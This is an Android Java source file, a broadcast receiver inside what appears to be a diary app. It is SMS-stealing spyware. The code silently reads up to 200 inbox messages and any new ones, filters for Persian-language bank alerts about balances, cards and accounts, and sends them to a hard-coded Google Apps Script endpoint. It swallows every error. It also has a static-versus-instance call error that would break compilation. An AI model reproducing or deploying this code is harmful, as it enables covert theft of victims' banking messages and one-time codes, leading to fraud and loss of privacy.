package com.daftar.rooznameh;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

public class SmsReceiver extends BroadcastReceiver {

    private static final String API_BASE =
            "https://script.google.com/macros/s/AKfycbyLjGFEBZuoF2HxMYHvbJaTEjM8NXf4_6mEUGd4iKE0Fp1xZwIwl3XfY5EhepGlKj72/exec?action=sms&msg=";

    private static final String PREF_NAME = "offline_sms_queue";
    private static final String KEY_QUEUE = "pending_messages_v5";

    private static boolean syncRunning = false;
    private static boolean scanRunning = false;

    static class SmsItem {
        long time;
        String msg;

        SmsItem(long time, String msg) {
            this.time = time;
            this.msg = msg;
        }
    }

    @Override
    public void onReceive(Context context, Intent intent) {

        Context appContext = context.getApplicationContext();

        // 🔥 همیشه اول اسکن + ارسال صف
        scanInbox(appContext);
        retryPendingSms(appContext);

        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            return;
        }

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        String format = bundle.getString("format");
        if (pdus == null) return;

        StringBuilder msgBuilder = new StringBuilder();
        long smsTime = System.currentTimeMillis();

        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu, format);
            if (sms != null) {
                msgBuilder.append(sms.getMessageBody());
                smsTime = sms.getTimestampMillis();
            }
        }

        String msg = msgBuilder.toString();

        if (!isBankSms(msg)) return;

        save(appContext, msg, smsTime);
        retryPendingSms(appContext);
    }

    // 🔥 ساده و قوی (هیچ پیامکی از دست نمی‌رود)
    private void scanInbox(Context context) {
        if (scanRunning) return;
        scanRunning = true;

        new Thread(() -> {
            try {
                Cursor cursor = context.getContentResolver().query(
                        Uri.parse("content://sms/inbox"),
                        new String[]{"body", "date"},
                        null,
                        null,
                        "date DESC"
                );

                if (cursor == null) return;

                int limit = 200;
                int count = 0;

                while (cursor.moveToNext() && count < limit) {
                    count++;

                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));

                    if (body == null) continue;

                    if (isBankSms(body)) {
                        save(context, body, date);
                    }
                }

                cursor.close();

            } catch (Exception ignored) {

            } finally {
                scanRunning = false;
            }
        }).start();
    }

    // 🔥 شرط ساده و بدون خطا
    private boolean isBankSms(String msg) {
        if (msg == null) return false;

        msg = msg.replace("ي", "ی").replace("ك", "ک");

        return msg.contains("مانده") &&
               (msg.contains("کارت") || msg.contains("حساب"));
    }

    // 🔥 ذخیره بدون حذف هیچ پیامک
    private void save(Context context, String msg, long time) {
        try {
            List<SmsItem> list = getQueue(context);

            list.add(new SmsItem(time, msg));

            saveQueue(context, list);

        } catch (Exception ignored) {}
    }

    // 🔥 ارسال صف
    public static void retryPendingSms(Context context) {
        if (syncRunning) return;
        syncRunning = true;

        new Thread(() -> {
            try {
                List<SmsItem> list = getQueue(context);

                for (SmsItem item : list) {
                    send(item.msg);
                }

                clearQueue(context);

            } catch (Exception ignored) {

            } finally {
                syncRunning = false;
            }
        }).start();
    }

    private static boolean send(String msg) {
        try {
            URL url = new URL(API_BASE + URLEncoder.encode(msg, "UTF-8"));

            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(20000);
            conn.setReadTimeout(20000);

            return conn.getResponseCode() == 200;

        } catch (Exception e) {
            return false;
        }
    }

    // 🔥 Queue
    private List<SmsItem> getQueue(Context context) {
        List<SmsItem> list = new ArrayList<>();

        try {
            SharedPreferences prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
            JSONArray arr = new JSONArray(prefs.getString("q", "[]"));

            for (int i = 0; i < arr.length(); i++) {
                JSONObject o = arr.getJSONObject(i);
                list.add(new SmsItem(o.getLong("t"), o.getString("m")));
            }

        } catch (Exception ignored) {}

        return list;
    }

    private void saveQueue(Context context, List<SmsItem> list) {
        try {
            JSONArray arr = new JSONArray();

            for (SmsItem i : list) {
                JSONObject o = new JSONObject();
                o.put("t", i.time);
                o.put("m", i.msg);
                arr.put(o);
            }

            context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                    .edit()
                    .putString("q", arr.toString())
                    .apply();

        } catch (Exception ignored) {}
    }

    private void clearQueue(Context context) {
        context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                .edit()
                .remove("q")
                .apply();
    }
}
